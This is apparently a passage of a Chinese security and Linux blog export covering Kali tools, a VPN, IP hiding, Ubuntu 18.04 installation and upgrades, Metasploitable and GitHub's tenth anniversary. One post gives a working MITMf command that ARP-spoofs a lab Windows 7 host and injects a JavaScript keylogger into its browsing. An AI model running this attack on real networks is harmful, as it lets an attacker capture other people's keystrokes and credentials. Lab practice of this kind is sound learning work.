    <content type="text"><![CDATA[今天说一款快速轻便的网络IP扫描工具吧，支持Windows，Linux，Mac OS X系统，我感觉是同类工具中最好用最简单的。虽然有人会说nmap是最好用的扫描信息收集工具，但是其参数太多，短时间内很难上手，而这款工具即使是你第一次使用，你也可以很快知道怎么用。GitHub项目地址：https://github.com/angryip/ipscan官方网站: https://angryip.org/我以kali Linux来进行演示。首先需要准备java的运行环境。kali已经自带了java环境。1root@kali:~# java -version 到官网下载与你的系统匹配的版本。开始安装1root@kali:~# dpkg -i ipscan_3.5.2_amd64.deb 开始运行1root@kali:~# ipscan 一直next即可打开运行了。然后开始设置一下，自定义的空间很大，根据自己需要设置即可，初次使用可以默认设置。开始扫描，我随便找的IP地址，仅为演示使用，不用作其他用处。扫描后，会立即弹出扫描信息，你也可以进行筛选，快速找到自己需要的信息。 扫描进群，我等待你的加入]]></content>
      <categories>
        <category>Kali</category>
      </categories>
      <tags>
        <tag>Linux</tag>
        <tag>Kali</tag>
        <tag>Ubuntu</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[科学上网教程3-在kali上挂VPN实现科学上网]]></title>
    <url>%2F2018%2F05%2F02%2F%E7%A7%91%E5%AD%A6%E4%B8%8A%E7%BD%91%E6%95%99%E7%A8%8B3-%E5%9C%A8kali%E4%B8%8A%E6%8C%82VPN%E5%AE%9E%E7%8E%B0%E7%A7%91%E5%AD%A6%E4%B8%8A%E7%BD%91%2F</url>
    <content type="text"><![CDATA[本次以kali Linux 2017.3进行演示，但是其他的Linux发行版本(eg：Ubuntu，Debian等)也是适用的。 首先打开网址: https://www.vpnbook.com/freevpn这个站是需要你可以科学上网的情况下才可以打开的，你可以通过本博客中的该教程来进行下载。我也已经将下载好的文件在群里放了一份 ，你可以通过下面的二维码扫码进群进行下载。如果你需要其他版本的该软件或者遇到安装问题不能解决，同样可以加群找我，我会很乐意为你解答的。好了，闲话少说，直接开始。 解压文件1root@kali:~# unzip VPNBook.com-OpenVPN-US1.zip 安装openvpn服务1root@kali:~# apt-get install openvpn 开启VPN1root@kali:~# openvpn --config vpnbook-us1-tcp443.ovpn 首先会提示你输入账号、密码。而账号、密码需要到该网站查找，需要注意的是，密码是动态的，也就是说下次你用vpnbook的时候，密码你需要再次去网站找，以免密码已经更改，输入原始密码错误导致无法成功连接。开启速度会有点慢，需要你慢慢等待，看到图中标注红线处才是成功开启。现在打开浏览器，查看一下IP是不是已经成功挂了VPN。好了，成功挂上VPN，可以做你想做的事了。不要抱怨网速慢，免费的够用就可以了。 扫码进群，我等待你的加入]]></content>
      <categories>
        <category>科学上网</category>
      </categories>
      <tags>
        <tag>Linux</tag>
        <tag>Kali</tag>
        <tag>Ubuntu</tag>
        <tag>科学上网</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Kali Linux 2018.2今日发布!]]></title>
    <url>%2F2018%2F05%2F01%2FKali-Linux-2018-2%E4%BB%8A%E6%97%A5%E5%8F%91%E5%B8%83%2F</url>
    <content type="text"><![CDATA[就在今天，Kali Linux开发团队正式发布Kali Linux 2018.2。这个kali的发行版(kali Linux 2018.2 Release)是第一款包含了Linux 4.15 内核的，包括x86和x64修补程序， Spectre和Meltdown 漏洞,更好地支持AMD GPUs 并支持 AMD安全加密虚拟化,可以允许加密虚拟机以至于hypervisor操作程序也不能获取到它。 更容易使用的Metasploit脚本如果你花大量的时间研究漏洞利用，你肯定熟悉各种metasploit脚本，比如 pattern_create, pattern_offset, nasm_shell 等。你可能也意识到这些所有有用的脚本都隐藏在 /usr/share/metasploit-framework/tools/exploit/目录里，这会有一点困难去使用这些脚本。幸运的是，比如 metasploit-framework_4.16.34-0kali2,你现在可以快速的使用这些脚本了，因为我们已经把这些脚本的软连接添加到了PATH里了，他们每一个都预先标注了msf-。12345678910root@kali:~# msf-msf-egghunter msf-java_deserializer msf-nasm_shellmsf-exe2vba msf-jsobfu msf-pattern_createmsf-exe2vbs msf-makeiplist msf-pattern_offsetmsf-find_badchars msf-md5_lookup msf-pdf2xdpmsf-halflm_second msf-metasm_shell msf-virustotalmsf-hmac_sha1_crack msf-msf_irb_shellroot@kali:~# msf-pattern_create -l 50 -s ABC,123A1A2A3B1B2B3C1C2C3A1A2A3B1B2B3C1C2C3A1A2A3B1B2B3C1 软件包更新此外除了以上的更新，也更新了一些软件，包括 Bloodhound, Reaver, PixieWPS, Burp Suite, Hashcat,等等。由于有太多的软件包含在一个默认的kali镜像中，为了查看所有的kali改变，我们建议你去看kali变更日志.下载 Kali Linux 2018.2如果你想体验更新更好的kali发行版本，你可以找到下载ISO和Torrents的链接在下载kali,适用于虚拟机和ARM设备的images也都更新到了2018.2。如果你已经安装了kali系统，那么你应该感到高兴，你可以使用下面的命令很方便的升级到2018.2。1root@kali:~# apt update &amp;&amp; apt full-upgrade 如果您遇到任何错误，我们希望你把bug报告给bug tracker，我们不能修复我们所不知道的bug。 本篇为我自己手工翻译的译文，原文来自kali官方文档.点此查看原文 扫码进群，我等待你的加入]]></content>
      <categories>
        <category>Kali</category>
      </categories>
      <tags>
        <tag>Kali</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[MITMF劫持教程1-劫持键盘记录]]></title>
    <url>%2F2018%2F04%2F28%2FMITMF%E5%8A%AB%E6%8C%81%E6%95%99%E7%A8%8B1-%E5%8A%AB%E6%8C%81%E9%94%AE%E7%9B%98%E8%AE%B0%E5%BD%95%2F</url>
    <content type="text"><![CDATA[首先查看自己的IP以及网关地址12root@kali:~# ifconfigroot@kali:~# route -n 接着扫描局域网内活动的主机1root@kali:~# nmap -sP 192.168.217.1/24 再选择攻击目标并对目标进行扫描，收集信息此处我选择了一台虚拟机下的Windows7.1root@kali:~# nmap -Pn -sS -O 192.168.217.133 -T4 查看MITMF的参数说明,寻找有关键盘记录的参数(无论任何工具在使用的时候都要先查看帮助说明)1root@kali:~# python mitmf.py --help 然后进行中间人欺骗攻击，劫持键盘输入记录12root@kali:~# source /root/.virtualenvs/MITMf/bin/activate(MITMf) root@kali:~/MITMf# python mitmf.py -i eth0 --spoof --arp --gateway 192.168.217.2 --target 192.168.217.133 --jskeylogger 我在Windows7上打开chrome浏览器，并在地址栏输入”bingyublog.com”。可以立马在kali终端看到很多请求出现。并且劫持到了你输入的字符，还有你打开的网址，以及浏览器和主机信息。(红线标记处是劫持到的键盘记录)]]></content>
      <categories>
        <category>Kali</category>
      </categories>
      <tags>
        <tag>Kali</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[kali下隐藏真实ip]]></title>
    <url>%2F2018%2F04%2F28%2Fkali%E4%B8%8B%E9%9A%90%E8%97%8F%E7%9C%9F%E5%AE%9Eip%2F</url>
    <content type="text"><![CDATA[今天介绍的这款工具是torghost，是一个通过Tor网络路由所有连接的工具，适用于Kali Linux系统，需要python2.7的环境，不适用于python3.x和Windows环境。项目地址: https://github.com/susmithHCK/torghost安装1234root@kali:~# git clone https://github.com/susmithHCK/torghost.gitroot@kali:~# cd torghost/root@kali:~/torghost# chmod +x install.shroot@kali:~/torghost# ./install.sh 参数：torghost start —–(开启 torghost)torghost stop —–(停止 torghost)torghost switch —-(切换 IP)有一点需要说明一下，由于你换了IP，而通过tor连接的IP不会是本国内的IP，这样也起到了隐藏真实IP的作用，但是网络速度会很慢，所以你的kali出现打不开网页的情况也是很正常的，只是因为网速慢导致的，可以在网络环境良好的环境使用。]]></content>
      <categories>
        <category>Kali</category>
      </categories>
      <tags>
        <tag>Kali</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[汉化Ubuntu18.04并设置时区]]></title>
    <url>%2F2018%2F04%2F27%2F%E6%B1%89%E5%8C%96Ubuntu18-04%E5%B9%B6%E8%AE%BE%E7%BD%AE%E6%97%B6%E5%8C%BA%2F</url>
    <content type="text"></content>
  </entry>
  <entry>
    <title><![CDATA[如何使用命令从Ubuntu16.04LTS升级到18.04]]></title>
    <url>%2F2018%2F04%2F27%2F%E5%A6%82%E4%BD%95%E4%BD%BF%E7%94%A8%E5%91%BD%E4%BB%A4%E4%BB%8EUbuntu16-04LTS%E5%8D%87%E7%BA%A7%E5%88%B018-04%2F</url>
    <content type="text"><![CDATA[您现在可以直接从Ubuntu 16.04 LTS系统升级至18.04。因为他们都是属于LTS版本。这意味着你不必做干净安装（重新安装）或重新格式化磁盘。我已经通过命令从16.04LTS成功升级到18.04，并且保持统一桌面和GNOME3的新特性。如果您也想要升级系统，可以遵循以下操作步骤进行。 使用命令升级的优点 1&gt; 保留了nity7桌面和GNOME3桌面，而不是删除它。2&gt; 保留了你安装的软件，但是升级了他们的版本，而不是删除它们。3&gt; 保留了你的存储文件夹和文件，没有删除它们。4&gt; 不需要重新安装系统。5&gt; 不需要重新格式化你的硬盘驱动器。6&gt; 使用终端，使得所有过程都更加清晰并且更加容易诊断是否存在任何错误。 第一：升级到最新的Ubuntu16.04 LTS12345$ sudo apt-get update$ sudo apt-get upgrade --yes$ sudo apt-get dist-upgrade --yes 这些命令可以使你的Ubuntu16.04 LTS升级为最新版本，现在最新的是16.04.4，这是十分重要的，在你升级到一个LTS版本的时候。记住，这些命令将会下载达到600 MB或者更大的软件包，并且会占据至少2个小时或者更多的时间完成整个安装过程。所以耐心等待直到完成。 第二：升级至18.04LTS1$ sudo do-release-upgrade 并且需要按Y和回车。(你不应该看到这个图的)你应该看到一个信息提示你18.04 LTS是可用的或者有许多的软件包是需要升级的(见下图)。如果你没有看到可用的升级(如上图)，然后你需要改变为如下的命令：1$ sudo do-release-upgrade -d 并且需要按Y和回车。(你应该看到这个图的)这个过程需要下载1GB或者更多的软件包并且占据至少2个小时或者更多的时间进行安装配置。所以耐心等待直到完成。 第三：接受删除安装包终端会询问是否允许删除一些安装包:按Y和回车enter 第四：接受重启最后，如果不存在错误，终端屏幕将会提示你已经完成系统升级并且请求你允许是否重新启动系统以完成所有新配置：按Y并回车enter。(升级完毕，现在重启) 结果下图1是从Ubuntu16.04 LTS升级的18.04 新桌面，接着的图是来自16.04的unity7桌面，我们并没有删除它，并且你可以从登陆屏幕进入unity7桌面&gt;选择齿轮图标&gt;选择unity。(原始的Ubuntu18.04桌面)(18.04的unity7桌面)s 本篇为翻译文章，是我人工翻译的，并没有使用机翻，如果出现任何错误、不当词语或者不通顺的地方可以在文章最下面扫码加群联系我进行修改。原文地址: http://www.ubuntubuzz.com/2018/04/how-to-upgrade-ubuntu-from-1604-lts-to-1804-lts-using-command-lines.html?utm_source=tuicool&amp;utm_medium=referral 扫码进群，我等待你的加入]]></content>
      <categories>
        <category>ubuntu</category>
      </categories>
      <tags>
        <tag>Ubuntu</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Ubuntu 18.04 LTS（仿生河狸）发布!]]></title>
    <url>%2F2018%2F04%2F27%2FUbuntu-18-04-LTS%EF%BC%88%E4%BB%BF%E7%94%9F%E6%B2%B3%E7%8B%B8%EF%BC%89%E5%8F%91%E5%B8%83%2F</url>
    <content type="text"><![CDATA[Canonical 今天正式发布了可用于计算机、IoT 和云环境的 Ubuntu 18.04 LTS （仿生河狸Bionic Beaver） 操作系统。 经过六个月的努力工作，被称之为（仿生河狸Bionic Beaver）的 Ubnutu 18.04 LTS 正式发布了，这也是 Ubuntu 的第七个长期支持版（LTS）。在直到 2023 年 4 月的五年内 Canonical 将为其提供安全和软件的更新，这期间将至少会有 5 个维护性更新版本，会将以后发布的 Ubuntu 中的新内核和显卡驱动更新到这个 LTS 版本当中。 正如预期的那样，Ubuntu 18.04 LTS 带来了几个新功能和变化，它开始使用 X.Org 服务器作为默认显示服务器来再次取代在 Ubuntu 17.10 中使用的 Wayland。另一方面，Canonical 计划在 Ubuntu 20.04 LTS 中再次启用 Wayland 作为默认的显示服务器，而现在它将以技术预览版的方式提供，在登录屏幕上可以选择。 另一个很酷的新功能是图形化安装器中的“最小安装[1]”方式，用户可以安装一个仅有 Mozilla 浏览器和一些方便的标准功能的操作系统。说到了图形安全器，它在这个新版本中进行了重新打造，所以你可以看到它添加了一些不同的选项，也有一些被移去了。Ubuntu 18.04 LTS 也有了由微软合作开发的新的 Hyper-V 优化镜像，它是 Windows 桌面上最快的 Ubuntu 桌面环境。对于云环境，Ubuntu 18.04 LTS 云镜像集成了 Nvidia GPU 硬件加速功能。 Canonical CEO 及 Ubuntu 的创始人 Mark Shuttleworth 说，“多云操作现在是新业态，优化了启动时间和性能的 Ubuntu 18.04 LTS 在各个主流云平台上将成为用于云计算的最快、最高效的操作系统，特别是在存储和像机器学习这样的计算密集型任务方面。” GNOME 3.28 作为默认桌面同 Ubuntu 17.10 一样，仿生河使用最新的 GNOME 桌面作为默认环境。除了 Nautilus 文件管理器仍旧是 3.26 之外，GNOME 所提供的所有应用都更新到了 3.28，因为事实上当前该版本不再由 GNOME 桌面管理。另外，在 Ubuntu 18.04 LTS 当中，Nautilus 以暗色风格重新进行了装扮。如果你从使用 GNOME 3.26 的 Ubuntu 17.10 升级的话就会发现，GNOME 3.28 自身也带来了许多变化。一个需要重点提出的功能是 GNOME Shell 界面现在支持雷雳 3 连接。另外，GNOME 3.28 新打造的 GNOME To Do 应用也被默认包括在 Ubuntu 18.04 LTS 当中了。 在所选用的应用当中，我们能注意到 GNOME 日历现在支持气候预报，所包括的 GNOME 字符应用替换了老的字符映射功能，GNOME Boxes 现在使用 spice-vdagent 为 Spice 客户端提供了更好的性能。LibreOffice 6.0 是默认办公套件，Mozilla FireFox 59.0.2 是默认浏览器，OpenJDK 10 是默认 JRE/JDK。多个应用以 Snap 的方式提供由于 Canonical 在推广其 Snappy 技术，它提供了更好的隔离性和安全，以及贯穿整个 LTS 生命周期的持续升级支持，毫无疑问 Ubuntu 18.04 LTS 将预装几个默认采用 Snap 统一封装包的应用。 这些应用包括 GNOME 日历、GNOME 字符、GNOME 日志和 GNOME 系统监视器等。为了使用户更易于安装 Snap 软件包，Ubuntu 软件应用现在可以让你轻松切换不同的 Snap 商店。有超过 3000 个 Snap 可以从 Snap 商店安装，包括 Firefox、Spotify、Skype 和 Slack 等流行应用。其它值得一提的还有，在大多数应用中支持彩色 emoji 字符。触摸板支持双指右击，而无需物理按键（可以在 GNOME 设置功能中修改该设置）。鼠标和触摸板有了新的驱动，即 libinput，如果你觉得它不适合你，你仍然可以通过设置来切换回 Synapics 驱动，但是 Canonical 将在以后版本移除它。最后，如果在电池供电时 20 分钟不操作的话，Ubuntu 18.04 LTS 将会自动休眠笔记本。Ubuntu 18.04 LTS 底层情况在底层，Ubuntu 18.04 LTS 使用的是 Linux 4.15 系列的内核，该系列内核最近将结束支持期。不过，我们认为 Canonical 将会继续支持它，直到今年年底发布的第一个维护版本 Ubuntu 18.04.1 LTS 为止——它将使用新的内核和图形驱动。 Canonical 在发布公告中称，“在 Ubuntu 18.04 LTS 中，gcc 现在默认编译程序为即时绑定的独立定位的可执行程序position independent executable（PIE），以更有效的利用地址空间布局随机化Address Space Layout Randomization（ASLR）技术。除了几个例外之外，所有主要的软件包都将重构以获得该能力。”对于 Meltdown 和 Spectre 安全漏洞的缓解措施也已经到位。 从 Ubuntu 17.10 以来有一些新的功能，不过如果你计划从更旧的版本升级，你应该看看“从 Ubuntu 16.04 LTS 以来的新变化”这篇文章。Ubuntu 18.04 LTS 现在可以下载了，在升级前，你应该看看如何从之前的版本升级。 Ubuntu 18.04 LTS 下载◈ Ubuntu 桌面版和服务器版 http://releases.ubuntu.com/18.04/◈ 其它架构的 Ubuntu 服务器 http://cdimage.ubuntu.com/ubuntu/releases/18.04/release/◈ Ubuntu 云镜像 https://www.ubuntu.com/download/cloud/◈ Ubuntu 物联网 https://www.ubuntu.com/download/iot/阅读原文]]></content>
      <categories>
        <category>ubuntu</category>
      </categories>
      <tags>
        <tag>Ubuntu</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[尝鲜-安装并设置Ubuntu18.04LTS]]></title>
    <url>%2F2018%2F04%2F27%2F%E5%B0%9D%E9%B2%9C-%E5%AE%89%E8%A3%85Ubuntu18-04LTS%2F</url>
    <content type="text"><![CDATA[昨天发布了Ubuntu18.04LTS，作为Ubuntu的忠实粉丝，我昨晚一直死守到0点，就是为了第一时间下载体验最新版的Ubuntu。今天我进行了Ubuntu18.04LTS的安装与设置，由于这是个LTS的版本，所以与16.04相比会出现很多的新特性。Ubuntu是每2年才发布一次LTS版本的，LTS版本是最稳定的版本，也是技术支持时间最久的版本，当然我说的都是桌面版本，不包括服务器版本。由于这款新系统是刚发布的，所以在我写这篇文章的时候，还在网上找不到任何安装教程，所以本篇文章全部为我本人 原创内容。 下载地址下载地址1(下载速度会快点): http://releases.ubuntu.com/bionic/下载地址2(下载速度稍慢): https://www.ubuntu.com/download/desktop 安装我是在VMware14上进行安装的，该版本的Ubuntu仍然可以使用简易安装。简易安装(推荐使用简易安装，简单省事，安装过程中不会出现任何错误)注意！！！虚拟机为你自动分配的安装位置，你不需要重新选择安装位置就会直接进入简易化安装。首先设置一下虚拟机选项，如图然后设置主机名和用户密码。随后就会直接到安装界面，由于是简易安装，所以你不需要在安装过程中做任何事，你只需要慢慢等待就可以了。自定义安装注意！！！你没有采用虚拟机为你默认分配的安装位置，而是自己自定义了其他的安装位置，这个时候你就会进入自定义安装。我们需要自己进行配置安装选项。按照下图所示的进行设置就可以了。然后下面是安装过程的图安装完成。 设置首次进入系统需要进行设置一下。下图是你第一次进入系统的图，可以从图中看到Ubuntu18.04的一些新特性。接着我们需要设置一下Livepatch.Livepatch在重启时候可以提高Ubuntu计算机的安全性，为安装内核修补程序提供了一种更方便的方法，给Ubuntu Linux内核打关键性安全补丁 。输入用户密码进行认证。然后如果你没有Ubuntu的账户你需要注册一个。需要注册一个Ubuntu的账户地址: https://login.ubuntu.com/+new_account按照如图所示的进行设置账户，不要随便填写信息。然后去自己的邮箱，认证一下，好了，可以成功登陆了。可以继续设置Livepatch了。设置反馈，提高Ubuntu的可用性。可以不用选择的。设置完毕。 进入桌面OK！全部工作已经完成。最后说明几点，注意看，按照本教程是一定可以正常安装的，如果你没有成功安装，说明你没有按照我的提示来做，教程里有几点细节你一定要注意。如果你已经严格按照教程来做了，但是仍旧没有安装失败，你可以校验一下你的镜像是否完整，校验工具在QQ群里，你也可以尝试重新安装.如果你在安装的时候虚拟机就出现了报错，你就不要继续安装了，你可以查看虚拟机的报错日志来解决问题，也可以通过加群与我讨论并解决问题。还有就是我在安装过程中，发现一个问题，18.04需要安装到c盘位置上，安装到其他盘会产生一个无法恢复的错误，虚拟机会提示“不能进行简易化安装”。导致你在第五步安装的时候失败。 扫码进群，我等待你的加入]]></content>
      <categories>
        <category>ubuntu</category>
      </categories>
      <tags>
        <tag>Ubuntu</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[一款中间人攻击测试框架 – MITMf]]></title>
    <url>%2F2018%2F04%2F26%2F%E4%B8%80%E6%AC%BE%E4%B8%AD%E9%97%B4%E4%BA%BA%E6%94%BB%E5%87%BB%E6%B5%8B%E8%AF%95%E6%A1%86%E6%9E%B6-%E2%80%93-MITMf%2F</url>
    <content type="text"><![CDATA[这个框架是非常厉害的，是一个中间人攻击的集合。我是在YouTube上看kali教程时候看到的。第一感觉就是特别强大。由于这款框架有很多的操作姿势，所以以后慢慢写操作教程，今天先演示安装过程。项目地址: https://github.com/byt3bl33d3r/MITMf演示环境: kali Linux2018.1(虚拟机安装)说明: debian、Ubuntu、kali等类似系统安装方式相同。其余版本Linux可以参考安装说明 首先说明一下，MITMF依赖大量的外部的库，因此你需要首先安装virtualenvs再来进行安装框架,virtualenv是用来为一个应用创建一套“隔离”的Python运行环境，可以使每个应用软件或者运行脚本各自拥有一套“独立”的Python运行环境。这样可以避免软件之间因为运行环境不同而产生的冲突，也可以避免使你的系统遭到不可恢复的损坏。 安装依赖1root@kali:~# apt-get install python-dev python-setuptools libpcap0.8-dev libnetfilter-queue-dev libssl-dev libjpeg-dev libxml2-dev libxslt1-dev libcapstone3 libcapstone-dev libffi-dev file 安装virtualenvwrapper1root@kali:~# pip install virtualenvwrapper 编译virtualenvwrapper.sh123root@kali:~# cd /usr/local/binroot@kali:~# lsroot@kali:~# source virtualenvwrapper.sh 注意！ virtualenvwrapper.sh脚本的位置取决于你的Linux版本，而不是相同的位置，你可以使用命令: find / -name virtualenvwrapper.sh -print 来查找该文件所在具体位置。 创建你的python独立运行环境 virtualenv1root@kali:~# mkvirtualenv MITMf -p /usr/bin/python2.7 clone MITMf仓库1root@kali:~# git clone https://github.com/byt3bl33d3r/MITMf 进入目录，并且进行初始化1root@kali:~# cd MITMf &amp;&amp; git submodule init &amp;&amp; git submodule update --recursive 安装依赖1root@kali:~# pip install -r requirements.txt 注意： 安装的依赖已经写在了requirements.txt文本中，不要破坏该文件，而且由于依赖很多，安装过程会很漫长，不要中途关机或者网络连接断开。 OK!安装完成，查看一下帮助1root@kali:~# python mitmf.py --help 注意注意注意！！！ 这一点非常重要，先提前说一下，以后演示操作的时候还有强调，我们创建的python独立运行环境 virtualenv，一定要首先进入这个独立运行环境中，再来运行MITMF，命令为:12root@kali:~# source /root/.virtualenvs/MITMf/bin/activate ## 进入virtualenv(MITMf) root@kali:~# deactivate ## 退出环境 扫码进群，我等待你的加入]]></content>
      <categories>
        <category>Kali</category>
      </categories>
      <tags>
        <tag>Kali</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[搭建Metasploitable靶机环境]]></title>
    <url>%2F2018%2F04%2F21%2F%E6%90%AD%E5%BB%BAMetasploitable%E9%9D%B6%E6%9C%BA%E7%8E%AF%E5%A2%83%2F</url>
    <content type="text"><![CDATA[Metasploitable是一款漏洞演练系统，本身设计作为安全工具测试和演示常见漏洞攻击，他的作用是用来作为MSF攻击用的靶机,他是一个具有无数未打补丁漏洞与开放了无数高危端口的渗透演练系统，可以使我们进行练习。首先点此进行下载，然后解压到电脑中。随后运行虚拟机，选择”打开虚拟机”，选择”.vmx”文件。然后点击”开启此虚拟机”。然后我们就进入了metasploitable靶机环境了。(只有命令界面，是没有gui的)账户与密码都是msfadmin.到此安装结束。由于metasploitable是基于Ubuntu的，所以基本的Linux命令依然是适用的。 扫码进群，我等待你的加入]]></content>
      <categories>
        <category>Metasploitable</category>
      </categories>
      <tags>
        <tag>Metasploitable</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[GitHub 十年，感谢有你]]></title>
    <url>%2F2018%2F04%2F16%2F%C2%96GitHub-%E5%8D%81%E5%B9%B4%EF%BC%8C%E6%84%9F%E8%B0%A2%E6%9C%89%E4%BD%A0%2F</url>
    <content type="text"><![CDATA[本文是 GitHub 联合创始人兼 CEO：Chris Wanstrath 在计算机世界杂志写的文章。当我们回顾 GitHub 过去十年，我们并不会想起某一款软件，而是想到人们用 GitHub 发生了何种改变。 十年前，GitHub 正式上线。初衷何其简单：连接开发者，通过 Git 更好开展项目。过去十年，我们已经成为一家公司、一个平台，慢慢壮大，但是初衷从未变过。并不是一个好点子或者什么大事件让这个平台特别，而是使用它的人，感谢 GitHub 十年，感谢有你。当我们回顾过去十年，我们不会记得某一款软件，而是人们用 GitHub 做的事。全世界各地都可以用 GitHub 来分享、教授、修补、构建。在最初上线 GitHub 的时候，我们完全没有预料到它能成长如斯，如此大的体量，如此多的贡献和连接。展望未来，我们依旧会保持简单。未来在你的手中，由你来定义。我们愿意跟随你。与此同时，感谢你的代码，你的合并、你的文档，你共享的项目以及你在 GitHub 所做的一切。谢谢你，10 years。我们收集了这十年来的一些里程碑，今天在这个特别的日子，我们一起来回顾。并未下一个十年做准备。 2008.4.10：GitHub 正式发布2008 年 4 月，我们的测试版结束，GitHub 推出了正式版，目的很简单：连接开发者，通过 Git 更容易的协同编程。 2008.4.3：Rails 转移到 Git 和 GitHubRuby on Rails 是内测时的首批大开源项目之一，考虑到 GitHub 基于 Rails 建立，这是一个重要的时刻。 2009.1.3：比特币的发明比特币于 2009 年被发明并在 2010 年发布到 GitHub。迄今为止此项目已有 18000+ 的 fork，500 merged pull request 作者，它启发了数以千计其他区块链的项目。 2009.5.21：Node.js 启动Node.js于 2009 年推出，导致人们使用 JavaScript 的方式发生根本性变化。借助 Node.js，开发人员可以使用 Angular，Ember，React，jQuery 和 Vue 等库和框架，在操作系统上构建复杂的服务器端和桌面应用程序。该项目有效地扩展了 JavaScript 的可能性，并成功推动了 JS。 2010.11.26:Rails Girls 夏编程之夏第一次举办Rails Girls 于 2010 年在赫尔辛基举办了首次活动。2013年，该团队开始了Summer of Code 全球奖学金计划，除了Google Summer of Code，Outreachy等，Rails Girls Summer of Code 对软件行业的产生了持久且积极的影响。 2011.2.28：Travis CI 第一个 pull requestTravis CI 是目前新兴的开源持续集成构建项目，它现已成为了 GItHub 的主要集成工具。 2012.1.1：JavaScript 成为 GitHub上最流行的语言在 2012 的开年，JavaScript 作为 GitHub 上最流行的语言，超越了 Ruby，Java 和 Python。今天它仍然是今天GitHub上最流行的语言。 2013.1.16：GitHub 社区用户达到 300 万在 2013 年我们创建了第 1000 万个仓库。 2014.6.9: Docker 1.0 发布2014 年 6 月，Docker 1.0 推出，之后一年多，Docker 引入了企业数据中心和云。它和 Kubernetes 等项目简化了 DevOps，将团队从基础架构中解放出来，以便更专注于最重要的事情。 2014.7.21：Django Grils 第一次举办2014年第一届 Django Girls 在柏林举办，开启了为期四年的世界各地软件培训和女性编程支持运动。 2014.10.23：微软开源.NET.NET 和.NET Foundation 只是微软开源计划的开始。现在该公司拥有数百个开源项目。其中包括去年拥有最多贡献者的 VS Code 和 2017 年发展最快的语言之一 TypeScript。微软也成为 GitHub 上最活跃的组织之一，数千名工程师，设计师和程序经理在平台和编程语言中贡献和发布软件。微软和谷歌等大公司对开源软件的重视，代表了他们对软件的态度。他们向我们表明，有时候重要的不是技术，而是社区以及人们如何使用技术。 2015.3.2：虚幻引擎4 源代码免费提供Epic Games 的团队发布了免费版本的「虚幻4」引擎，这让创意与开发更更紧密连接在一起。免费的源代码允许访问主要功能。从错误修复到 Git 集成，他们的最新版本得到了 128 个 contribution 的帮助。由于开源游戏引擎，Game 成为了 2017 GitHub 最受欢迎的类目。Phaser，Godot Engine 和其他项目，如 Itch.io，正在塑造人们建立和分享独立游戏的方式。像 2048 这样的开源学习资源和游戏，激发了数百个 Clone，邀请了更多的人来玩和创造。 2015.9.22：GitHub class 开课GitHub Class 使教师更容易分发代码收集作业，今天，高中、大学、编程培训机构的学生们正在使用它来学习，现在有超过 180 万个 class 的库，但这也仅仅是 GitHub 教育资源的一部分。 2015.12.3：Apple 开源 SwiftApple 这个决定提高了新开发工具的标准，并鼓励更多的公司发布开源。 2016.7.9：阿波罗 11 代码开源阿波罗 11 号于 1969 年登月，四十七年后，它的启动源代码登录 GitHub，其中还包含了很多彩蛋，这也证明了 20 世纪 60 年代的程序员也有幽默感。NASA 维护者数百个开源项目，包括火星可视化地图，通过 TensorFlow 来识别系外行星的软件等等。你还可以找到 SpaceX 这些公司的开源项目。 2017.2.10：Python 团队打开他们的第一个 pull request在过去十年，Pyhon 已经成为增长最快的主要编程语言之一，自 2015 年来，它一直稳居 GitHub 语言前三。Python 的历史可以追溯到 20 世纪 90 年代，近年来因为数据科学和机器学习使它飞速发展。像 Pandas 这样广受欢迎的库，也让 Python 更流行。 2017.2.15：TensorFlow 1.0 启动谷歌在 2015年 将其内部机器学习库 TensorFlow 公开。去年，它是 GitHub 上最受欢迎的项目之一，TensorFlow在2017年的访问量比2016年多5.5倍。现在，TensorFlow 是数据专业人员创建机器学习模型的首选工具。 2017.5.2：30000 个 NGO（非营利组织）用户非营利组织通过技术产生了难以置信的积极影响。去年，30000 个非营利用户通过我们展开了 Human Utility，Maven和ConnectHome 等活动，让世界变得更美好。野生动物保护协会（WCS）的海洋保护涵盖 25 个国家，保护世界的珊瑚礁。在肯尼亚，WCS使用软件收集全球研究人员的数据，并通过收集物种数据，监测超过 252 公顷的沿海礁石，这相当于 260 个足球场那么大。帮助当地更绿色生态地进行捕捞。 2017.5.31：第 1 亿次 pull request被合并事实上，仅在 2017 一年，有 2.9 万亿行代码被提交。 2018.4.10：十年的代码，协作和提交GitHub 正式推出十年后，我们的社区已经发展到全球拥有超过 8000 万个项目的 2700 万名开发人员。 感谢您创建的存储库，感谢您的贡献以及您构建的软件。感谢你 10 年的代码。 原文：10 years of GitHub]]></content>
      <categories>
        <category>GitHub</category>
      </categories>
      <tags>
        <tag>GitHub</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[我编程很渣，但我就是喜欢编程，我该怎么做？放弃还是继续坚持？]]></title>
    <url>%2F2018%2F04%2F16%2F%E6%88%91%E7%BC%96%E7%A8%8B%E5%BE%88%E6%B8%A3%EF%BC%8C%E4%BD%86%E6%88%91%E5%B0%B1%E6%98%AF%E5%96%9C%E6%AC%A2%E7%BC%96%E7%A8%8B%EF%BC%8C%E6%88%91%E8%AF%A5%E6%80%8E%E4%B9%88%E5%81%9A%EF%BC%9F%E6%94%BE%E5%BC%83%E8%BF%98%E6%98%AF%E7%BB%A7%E7%BB%AD%E5%9D%9A%E6%8C%81%EF%BC%9F%2F</url>
